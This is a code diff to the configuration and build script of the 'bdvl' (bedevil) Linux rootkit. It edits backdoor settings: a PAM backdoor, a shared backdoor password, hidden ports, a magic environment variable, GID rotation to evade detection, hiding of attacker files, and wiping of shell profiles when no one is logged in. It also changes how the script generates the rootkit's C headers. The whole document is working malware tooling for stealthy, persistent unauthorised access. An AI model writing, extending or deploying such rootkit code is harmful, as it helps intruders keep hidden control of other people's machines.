@@ -5,6 +5,7 @@
 
 # BACKDOOR SETTINGS
 
+
 BACKDOOR_PASS = None  # password for all doors. set to None = random
 
 USE_PAM_BD = True
@@ -55,7 +56,7 @@ AUTO_GID_CHANGER   = True   # change gid at least every `GID_CHANGE_MINTIME` sec
 GID_CHANGE_MINTIME = 60 * 30
 
 
-HIDE_MY_ASS      = True     # keep track of hidden things that don't belong to the rootkit. for example something created by you in /tmp. works recursively. initially was for rehiding upon a GID change.
+HIDE_MY_ASS      = True     # keep track of hidden things created by yourself that don't belong to the rootkit. works recursively. initially was for rehiding upon a GID change.
 UNINSTALL_MY_ASS = True     # when running `./bdv uninstall`, bdvl will remove all of the hidden paths kept track of by HIDE_MY_ASS. also works recursively.
 CLEANSE_HOMEDIR  = True     # remove .bashrc, .profile & symlinks when not logged into the box. (when no rootkit processes or hidden ports are alive)
 
@@ -176,6 +177,11 @@ from random import choice
 from os import listdir, system, unlink, mkdir
 from os.path import basename, isdir
 from binascii import hexlify
+from sys import argv
+
+if(len(argv) < 2):
+    print('Missing argument: NEW_INC')
+    quit()
 
 alowercase, auppercase = ascii_lowercase, ascii_uppercase
 
@@ -275,11 +281,11 @@ class Definitions():
 
     # gets all identifiers for data in the target array
     def getidents(self):
-        idents = ''
+        idents = '/*  IDENTS  */\n'
         for i in range(self.list_len):
             our_name = self.array_list[i]
             idents += self.getident(our_name, i)
-        return idents
+        return idents+'\n\n'
 
 
 # handy class. trusty class. thank you class.
@@ -313,10 +319,11 @@ class CArray(): # default is assumed to be an array of char pointers
 
     # create full C array.
     def create(self):
-        result = self.getsizedef()
+        result = '/*   {0}   */\n'.format(self.name)
+        result += self.getsizedef()
         result += self.declarearray()
         result += self.buildelems()
-        return result
+        return result+'\n'
 
 
 class Util():
@@ -420,10 +427,9 @@ INSTALL_DIR = ut.randpath(14)
 BDVLSO = ut.sogetname(INSTALL_DIR)
 CLEANEDTIME_PATH = ut.randpath(12) if not FILE_CLEANSE_TIMER == None else None
 
-INC, NEW_INC = 'inc', 'new_inc'
+INC, NEW_INC = 'inc', argv[1]
 CONFIGH      = NEW_INC + '/config.h'
 HOOKS_PATH   = NEW_INC + '/hooks/libdl/hooks' # list of everything we're hooking & the libraries they originate from.
-SETTINGS_CFG = NEW_INC + '/settings.cfg'      # auto.sh reads BDVLSO from here.
 
 BDVLH = NEW_INC + '/bedevil.h'
 SETTINGS = { # all of these are written to bedevil.h. if a value is None it is skipped.
@@ -481,7 +487,7 @@ BDVLPATHS = {
 }
 
 NOTRACK = {  # stuff that HIDE_MY_ASS does not need to track.
-    '/proc':True,
+    '/proc':True, '/root':True, '/tmp':True,
     SETTINGS['GID_PATH']:READ_GID_FROM_FILE,   SETTINGS['INSTALL_DIR']:True,
     SETTINGS['PRELOAD_FILE']:True,             SETTINGS['OLD_PRELOAD']:True,
     SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER, SETTINGS['HIDEPORTS']:True,
@@ -521,24 +527,6 @@ def listconditional(dictlist):
 
 
 def setup_config():
-    if not isdir('./build'):
-        mkdir('./build')
-
-    if REWRITE_BASHRC == True:
-        basharr = ut.hexarraylifypath('etc/.bashrc', 'rkbashrc')
-        with open(INC+'/util/magic/bashrc.h', 'w') as fd:
-            fd.write(basharr)
-            fd.close()
-
-    if REWRITE_ROLF == True:
-        with open('etc/.rolf', 'r') as fd:
-            rolf = fd.read().strip().split('\n')
-            fd.close()
-        rolfarr = CArray('rolfs', rolf)
-        with open(INC+'/util/magic/rolf.h', 'w') as fd:
-            fd.write(rolfarr.create())
-            fd.close()
-
     copytree(INC, NEW_INC)
     writecfg()
 
@@ -563,11 +551,12 @@ def setup_config():
         if PRINT_ALL_SETTINGS == True:
             print('\033[1;31m{0}\033[0m: {1}'.format(target, value))
 
+            gotbdvlh += '/*  {0}  */\n'.format(target)
         try:
             gotbdvlh += '#define {0} \"'.format(target) + value + '\"\n'
         except:
             gotbdvlh += '#define {0} {1}\n'.format(target, str(value))
-        gotbdvlh += '#define LEN_{0} {1}\n'.format(target, len(str(value)))
+        gotbdvlh += '#define LEN_{0} {1}\n\n'.format(target, len(str(value)))
 
 
     defs = Definitions(h.ALL_HOOKS)
@@ -605,7 +594,7 @@ def setup_config():
     targetarrays = list(bdvlarrays.values())
     for i in range(len(arraynames)):
         thisarr = CArray(arraynames[i], targetarrays[i])
-        gotbdvlh += thisarr.create()
+        gotbdvlh += thisarr.create()+'\n'
     gotbdvlh += 'syms symbols[ALL_SIZE];\n'
 
     bdvlportsarr = CArray('bdvlports', BDVLPORTS, arrtype='int')
@@ -622,10 +611,8 @@ def setup_config():
     with open(BDVLH, 'w') as fd:
         fd.write(gotbdvlh)
         fd.close()
-
-    # for auto.sh
-    with open(SETTINGS_CFG, 'w') as fd:
-        fd.write(SETTINGS['BDVLSO']+'\n')
+    with open('build/{0}.h'.format(PAM_UNAME), 'w') as fd:
+        fd.write(gotbdvlh)
         fd.close()
 
     # mk tar.gz of include dir. b64 it. rm it.
@@ -644,7 +631,31 @@ def setup_config():
 
 
 if __name__ == '__main__':
+    if isdir(NEW_INC):
+        print('Directory {0} already exists. Not doing setup again.'.format(NEW_INC))
+        quit()
+
+    if not isdir('./build'):
+        mkdir('./build')
+
+
+    if REWRITE_BASHRC == True:
+        basharr = ut.hexarraylifypath('etc/.bashrc', 'rkbashrc')
+        with open(INC+'/util/magic/bashrc.h', 'w') as fd:
+            fd.write(basharr)
+            fd.close()
+
+    if REWRITE_ROLF == True:
+        with open('etc/.rolf', 'r') as fd:
+            rolf = fd.read().strip().split('\n')
+            fd.close()
+        rolfarr = CArray('rolfs', rolf)
+        with open(INC+'/util/magic/rolf.h', 'w') as fd:
+            fd.write(rolfarr.create())
+            fd.close()
+
     setup_config()
+
     print('')
     print('Hidden port(s): ' + str(BDVLPORTS))
     print('Magic environment variable: ' + SETTINGS['BD_VAR'])
